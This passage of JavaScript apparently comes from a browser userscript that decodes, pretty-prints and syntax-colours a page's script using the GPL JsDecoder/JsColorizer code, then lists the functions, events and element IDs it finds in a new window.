    this.keywords = ['abstract', 'boolean', 'break', 'byte', 'case', 'catch', 'char', 'class',
        'const', 'continue', 'default', 'delete', 'do', 'double', 'else', 'extends', 'false',
        'final', 'finally', 'float', 'for', 'function', 'goto', 'if', 'implements', 'import',
        'in', 'instanceof', 'int', 'interface', 'long', 'native', 'new', 'null', 'package',
        'private', 'protected', 'public', 'return', 'short', 'static', 'super', 'switch',
        'synchronized', 'this', 'throw', 'throws', 'transient', 'true', 'try', 'typeof', 'var',
        'void', 'while', 'with'];
}

if (typeof Array.prototype.indexOf == 'undefined') {
    /* Finds the index of the first occurence of item in the array, or -1 if not found */
    Array.prototype.indexOf = function(item) {
        for (var i = 0; i < this.length; i++) {
            if ((typeof this[i] == typeof item) && (this[i] == item)) {
                return i;
            }
        }
        return -1;
    };
}
if (!String.prototype.trim) {
    String.prototype.trim = function() {
        return this.replace(/^\s*|\s*$/g, '');
    };
}

function str_repeat(str, repeat)
{
    ret = '';
    for (var i = 0; i < repeat; i++) {
        ret += str;
    }
    return ret;
}

var debug_w;
function debug (arr, name)
{
    if (!debug_w) 
    {
        var width = 600;
        var height = 600;
        var x = (screen.width/2-width/2);
        var y = (screen.height/2-height/2);
        debug_w = window.open('', '', 'scrollbars=yes,resizable=yes,width='+width+',height='+height+',screenX='+(x)+',screenY='+y+',left='+x+',top='+y);
        debug_w.document.open();
        debug_w.document.write('<html><head><style>body{margin: 1em;padding: 0;font-family: courier new; font-size: 12px;}h1,h2{margin: 0.2em 0;}</style></head><body><h1>Debug</h1></body></html>');
        debug_w.document.close();
    }
    var ret = '';
    if ('undefined' !== typeof name && name.length) {
        ret = '<h2>'+name+'</h2>'+"\n";
    }
    if ('object' === typeof arr) {
        for (var i = 0; i < arr.length; i++) {
            ret += '['+i+'] => '+arr[i]+"\n";
        }
    } else if ('string' == typeof arr) {
        ret += arr;
    } else {
        try { ret += arr.toString(); } catch (e) {}
        ret += ' ('+typeof arr+')';
    }
    debug_w.document.body.innerHTML += '<xmp>'+ret+'</xmp>';
}


/*
 * DO NOT REMOVE THIS NOTICE
 *
 * PROJECT:   JsDecoder
 * VERSION:   1.1.0
 * COPYRIGHT: (c) 2004-2008 Cezary Tomczak
 * LINK:      http://code.gosu.pl
 * LICENSE:   GPL
 */

function JsColorizer() {
    this.color = {
        "keyword":   "#0000FF",
        "object":    "#FF0000",
        "quotation": "#FF00FF",
        "comment":   "#008000"
    };

    this.s = ""; // code to colorize
    this.i = 0;
    this.len = 0;

    this.ret = ""; // colorized code
    this.lastWord = ""; // last alphanumeric word
    this.nextChar = "";
    this.prevChar = "";

    this.code = [""];
    this.row = 0;

    this.times = {
        quotation: 0, quotation_calls: 0,
        lineComment: 0, lineComment_calls: 0,
        comment: 0, comment_calls: 0,
        slash: 0, slash_calls: 0,
        word: 0, word_calls: 0
    };

    this.write = function (s)
    {
        this.code[this.row] += s;
        if (s.length == 1) {
            this.prevChar = s;
        } else {
            this.prevCharInit();
        }
    };
    this.writeLine = function ()
    {
        this.code.push("");
        this.row++;
        this.prevChar = "\n";
    };
    this.prevCharInit = function ()
    {
        this.prevChar = this.code[this.row].charAt(this.code[this.row].length - 1);
    };

    this.showTimes = function ()
    {
        var ret = '';
        for (var f in this.times) {
            var t = this.times[f];
            if (/_calls/.test(f)) {
                ret += f+': '+t+"\n";
            } else {
                ret += f+': '+time_round(t)+" sec\n";
            }
        }
        return ret;
    };

    this.colorize = function()
    {
        this.len = this.s.length;
        while (this.i < this.len)
        {
            var c = this.s.charAt(this.i);
            if (this.len - 1 == this.i) {
                this.nextChar = "";
            } else {
                this.nextChar = this.s.charAt(this.i + 1);
            }
            switch (c) {
                case "\n":
                    if (this.lastWord.length) { this.word(); }
                    this.lastWord = '';
                    this.writeLine();
                    break;
                case "'":
                case '"':
                    if (this.lastWord.length) { this.word(); }
                    this.lastWord = '';
                    this.quotation(c);
                    break;
                case "/":
                    if (this.lastWord.length) { this.word(); }
                    this.lastWord = '';
                    if ("/" == this.nextChar) {
                        this.lineComment();
                    } else if ("*" == this.nextChar) {
                        this.comment();
                    } else {
                        this.slash();
                    }
                    break;
                default:
                    if (/^\w$/.test(c)) {
                        this.lastWord += c;
                    } else {
                        if (this.lastWord.length) { this.word(); }
                        this.lastWord = '';
                        this.write(c);
                    }
                    break;
            }
            this.i++;
        }
        this.write(this.lastWord);
        return this.code.join("\n");
    };

    this.quotation = function(quotation)
    {
        //var time = time_start();
        var s = quotation;
        var escaped = false;
        while (this.i < this.len - 1) {
            this.i++;
            var c = this.s.charAt(this.i);
            if ("\\" == c) {
                escaped = (escaped ? false : true);
            }
            s += c;
            if (c == quotation) {
                if (!escaped) {
                    break;
                }
            }
            if ("\\" != c) {
                escaped = false;
            }
        }
        this.write('<font color="'+this.color.quotation+'">' + s + '</font>');
        //this.times.quotation += time_get(time);
        //this.times.quotation_calls++;
    };

    this.lineComment = function()
    {
        //var time = time_start();
        var s = "//";
        this.i++;
        while (this.i < this.len - 1) {
            this.i++;
            var c = this.s.charAt(this.i);
            s += c;
            if ("\n" == c) {
                break;
            }
        }
        this.write('<font color="'+this.color.comment+'">' + s + '</font>');
        //this.times.lineComment += time_get(time);
        //this.times.lineComment_calls++;
    };

    this.comment = function()
    {
        //var time = time_start();
        var s = "/*";
        this.i++;
        var c = "";
        var prevC = "";
        while (this.i < this.len - 1) {
            this.i++;
            prevC = c;
            c = this.s.charAt(this.i);
            s += c;
            if ("/" == c && "*" == prevC) {
                break;
            }
        }
        this.write('<font color="'+this.color.comment+'">' + s + '</font>');
        //this.times.comment += time_get(time);
        //this.times.comment_calls++;
    };

    /* SLASH
     * divisor /= or *\/ (4/5 , a/5)
     * regexp /\w/ (//.test() , var asd = /some/;) */
    this.slash = function()
    {
        //var time = time_start();
        var a_i = this.i - 1;
        var a_c = this.s.charAt(a_i);
        for (a_i = this.i - 1; a_i >= 0; a_i--) {
            var c2 = this.s.charAt(a_i);
            if (" " == c2 || "\t" == c2) {
                continue;
            }
            a_c = this.s.charAt(a_i);
            break;
        }
        var a = /^\w+$/.test(a_c) || ']' == a_c || ')' == a_c;
        var b = ("*" == this.prevChar);
        if (a || b) {
            if (a) {
                if ("=" == this.nextChar) {
                    this.write("/");
                } else {
                    this.write("/");
                }
            } else if (b) {
                this.write("/");
            }
        } else if (')' == this.prevChar) {
            this.write('/');
        } else {
            var ret = '';
            if ("=" == this.prevChar) {
                ret += "/";
            } else {
                ret += "/";
            }
            var escaped = false;
            while (this.i < this.len - 1) {
                this.i++;
                var c = this.s.charAt(this.i);
                if ("\\" == c) {
                    escaped = (escaped ? false : true);
                }
                ret += c;
                if ("/" == c) {
                    if (!escaped) {
                        break;
                    }
                }
                if ("\\" != c) {
                    escaped = false;
                }
            }
            this.write('<font color="'+this.color.quotation+'">' + ret + '</font>');
        }
        //this.times.slash += time_get(time);
        //this.times.slash_calls++;
    };

    this.word = function()
    {
        //var time = time_start();
        if (this.keywords.indexOf(this.lastWord) != -1) {
            this.write('<font color="'+this.color.keyword+'">' + this.lastWord + '</font>');
        } else if (this.objects.indexOf(this.lastWord) != -1) {
            this.write('<font color="'+this.color.object+'">' + this.lastWord + '</font>');
        } else {
            this.write(this.lastWord);
        }
        //this.times.word += time_get(time);
        //this.times.word_calls++;
    };

    this.keywords = ["abstract", "boolean", "break", "byte", "case", "catch", "char", "class",
        "const", "continue", "default", "delete", "do", "double", "else", "extends", "false",
        "final", "finally", "float", "for", "function", "goto", "if", "implements", "import",
        "in", "instanceof", "int", "interface", "long", "native", "new", "null", "package",
        "private", "protected", "public", "return", "short", "static", "super", "switch",
        "synchronized", "this", "throw", "throws", "transient", "true", "try", "typeof", "var",
        "void", "while", "with"];

    this.objects = ["Anchor", "anchors", "Applet", "applets", "Area", "Array", "Button", "Checkbox",
        "Date", "document", "FileUpload", "Form", "forms", "Frame", "frames", "Hidden", "history",
        "Image", "images", "Link", "links", "Area", "location", "Math", "MimeType", "mimeTypes",
        "navigator", "options", "Password", "Plugin", "plugins", "Radio", "Reset", "Select",
        "String", "Submit", "Text", "Textarea", "window"];
}


    function findFunctionAddresses(StrObj)
    {
    
    var Function = ""; // if no match, use this
    
    var FunctionsPlainArray = StrObj.match(/(function+[\s]?[\S]+[\s{0,1}]?[\(]?[\S]?[\)]+)/gi);   
    var FunctionsArray = StrObj.match(/(function +[\w\s]+[\(]?[\s\w\,\_]+[\)]+)/gi);
    
    var count = 1;
    if(FunctionsArray){Function += count +") " + FunctionsArray[0] + " ...<br>";count++;}
    if (FunctionsPlainArray)
    {
        for (var i = 0; i < FunctionsPlainArray.length; i++)
        {
            if (i != 0)             
            Function += "<br>";
            Function += count +") " + FunctionsPlainArray[i] + " ...";
            count++;
        }
    }
    var InlineFunctionsPlainArray = StrObj.match(/(function[\(][\)]+)/gi);
    if (InlineFunctionsPlainArray)
    {    
        for (var i = 0; i < InlineFunctionsPlainArray.length; i++)
        {
            if (i != 0 || count!=1)             
            Function += "<br>";
            Function += count +") " + InlineFunctionsPlainArray[i] + " ... [Inline Function]";
            count++;
        }
    }
    if(Function == ""){Function="No functions exit.";}
    return Function;
    }
    
    
    function findEventsAddresses(StrObj)
    {
    
    var Events = "No Events found."; // if no match, use this
    var EventsPlainArray = StrObj.match(/on(abort|activate|afterprint|afterupdate|beforeupdate|beforeactivate|beforecopy|beforecut|beforedeactivate|beforeeditfocus|beforepaste|beforeprint|beforeunload|begin|blur|bounce|cellchanged|change|click|contextmenu|controlselect|copy|cut|dataavailable|datasetchanged|datasetcomplete|dblclick|deactivate|drag|dragend|dragleave|dragenter|dragover|dragdrop|drop|end|error|errorupdate|exit|filterchange|finish|focus|focusin|focusout|help|keydown|keypress|keyup|layoutcomplete|load|losecapture|mediacomplete|mediaerror|mousedown|mouseenter|mouseleave|mousemove|mouseout|mouseover|mouseup|mousewheel|move|moveend|movestart|outofsync|paste|pause|progress|propertychange|readystatechanged|repeat|reset|resize|resizeend|resizestart|resume|reverse|rowenter|rowexit|rowdelete|rowinserted|scroll|seek|select|selectionchanged|selectstart|start|stop|synchrestored|submit|timeerror|trackchanged|unload|urlflip)/gi);
    if (EventsPlainArray) {
    Events = "";
    for (var i = 0; i < EventsPlainArray.length; i++)
    {
    if (i != 0)
    Events += "<br>";
    Events += (i+1) +") " + EventsPlainArray[i];    
          }
       }
    return Events;
    }
    
    
    function findIDsAddresses(StrObj)
    {
    
    var IDs = "No id or class or name found."; // if no match, use this
    var IDsArray = StrObj.match(/((name|id|class)+[\s\=]+[\"\']?[\S\w]+[\'\"])/gi);
    if (IDsArray) {
    IDs = "";
    for (var i = 0; i < IDsArray.length; i++)
    {
    if (i != 0) 
    IDs += "<br>";
    IDs += (i+1) +") " + IDsArray[i];
          }
       }
    return IDs;
    }
    
    
// Start Conversion ::

    var base_code = '';
    var jsdecoder;
    var jscolorizer;
    var code = '';
    var time = 0;
    var msg = '';
    var raw = '';
    var colorcodes = '';
    var js_url = document.URL.substring(0,document.URL.lastIndexOf("?"));
    function decode()
    {
        code = '';
        base_code = '';
        raw = document.body.innerHTML;
        raw = raw.replace(/<pre>/gi,"");
        raw = raw.replace(/<\/pre>/gi,"");
        jsdecoder = new JsDecoder();
        jscolorizer = new JsColorizer();        
        jsdecoder.s = raw;
        do_decode_init();

    }
    function do_decode_init()
    {
        setTimeout(do_decode, 50);
    }
    function do_decode()
    {
        time = time_start();        
        
        try {
            code = jsdecoder.decode();
            base_code = code;
        } catch (e) {
            msg += 'error<br><br>'+new String(e).replace(/\n/g, '<br>');
            return;
        }        
        setTimeout(do_colorize_init, 50);
    }
    function do_colorize_init()
    {
        setTimeout(do_colorize, 50);
    }
    function do_colorize()
    {
        time = time_start();
        code = code.replace(/&/g, "&amp;");
        code = code.replace(/</g, "&lt;");
        code = code.replace(/>/g, "&gt;");
        jscolorizer.s = code;
        try {
            code = jscolorizer.colorize();
        } catch (e) {
            msg  += 'Error<br><br>'+new String(e).replace(/\n/g, '<br>');
            return;
        }
        
        /* debug:
        $('msg').innerHTML += '&nbsp;&nbsp;&nbsp;&nbsp;'+jscolorizer.showTimes().replace(/\n$/, '').replace(/\n/g, '<br>&nbsp;&nbsp;&nbsp;&nbsp;')+'<br>';
        */
        setTimeout(do_insert_init, 50);
    }
    function do_insert_init()
    {
        setTimeout(do_insert, 50);
    }
    function do_insert()
    {
        time = time_start();
        try {
        
            code = new String(code);
            code = code.replace(/(\r\n|\r|\n)/g, "<br>\n");
            code = code.replace(/<font\s+/gi, '<font@@@@@');
            code = code.replace(/( |\t)/g, '&nbsp;');
            code = code.replace(/<font@@@@@/gi, '<font ');

            code = code.replace(/\n$/, '');

            var count = 0;
            var pos = code.indexOf("\n");
            while (pos != -1) {
               count++;
               pos = code.indexOf("\n", pos+1);
            }
            count++;

            pad = new String(count).length;
            var lines = '';

            for (var i = 0; i < count; i++) {
                var p = pad - new String(i+1).length;
                var no = new String(i+1);
                for (k = 0; k < p; k++) { no = '&nbsp;'+no; }
                no += '&nbsp;';
                lines += '<div style="background: #fff; color: #666;">'+no+'</div>';
            }
           
		    var jsfindings = "";
		        jsfindings += "<strong>Functions Identified:</strong><br>" + findFunctionAddresses(document.body.innerHTML);
		        jsfindings += "<br><br><strong>Events Used Order Identified:</strong><br>" + findEventsAddresses(document.body.innerHTML)+ "<br>";
		        jsfindings += "<br><strong>Names/IDs/Classes Identified:</strong><br>" + findIDsAddresses(document.body.innerHTML)+ "<br>";
        
			msg = '<div>' + msg + '</div>';			
			colorcodes = '<div id="code_area"><table cellspacing="0"cellpadding="0"style="font-family: courier new; font-size: 12px;"width="100%"><tr><td valign="bottom" id="lines" width="10">'+ lines+ '</td><td nowrap style="background: #f5f5f5;">' + code + '</td></tr></table></div>';
			unsafeWindow.w =  window.open("", '', 'fullscreen=true,toolbar=no,resizable=yes,scrollbars= yes, status = yes,width=1000,height=800,left=0,top=0');			
			unsafeWindow.w.document.title = js_url;			
			unsafeWindow.w.document.body.setAttribute("style","font:12px arial;line-height:2em;");
			msg = '<div id="msg" style="padding-left:2%;padding-top:2%;padding-bottom:2%;border:1px dashed gray;font-family: arial; font-size: 13px; margin: 1em 0;">' + jsfindings + msg + '</div><br>Code: ';			
			colorcodes = '<div id="code_area"><table cellspacing="0"cellpadding="0"style="font-family: courier new; font-size: 12px;"width="100%"><tr><td valign="bottom" id="lines" width="10">'+ lines+ '</td><td nowrap style="background: #f5f5f5;padding-left:1%;">' + code + '</td></tr></table></div>';
						
			unsafeWindow.w.document.body.innerHTML = msg + colorcodes;			
			unsafeWindow.close();
		         

        } catch (e) {
            msg +=  'error<br><br>'+new String(e).replace(/\n/g, '<br>');
            return;
        }
        
        msg +=  'ok ('+time_end(time)+' sec)';
        code = '';
    }
    function do_clean_init()
    {
        //$('msg').innerHTML = 'Removing code .. ';
        setTimeout(do_clean, 50);        
    }
    function do_clean()
    {
        time = time_start();
        base_code = '';       
        jsdecoder.s = document.body.innerHTML;
        setTimeout(do_decode_init, 50);
    }
 
    function $(id)
    {
        return document.getElementById(id);
    }
    function time_micro()
    {
        var micro = new String(new Date().getTime());
        micro = micro.substr(0, micro.length-3) + '.' + micro.substr(micro.length-3, 3);
        return parseFloat(micro);
    }
    function time_start()
    {
        return time_micro();
    }
    function time_get(start)
    {
        return time_micro() - start;
    }
    function time_end(start)
    {
        return time_round(time_micro() - start);
    }
    function time_round(time)
    {
        time = Math.round(time * 100) / 100;
        if (time === 0) { time = 0.01; }
        return time;
    }
	decode();	
}
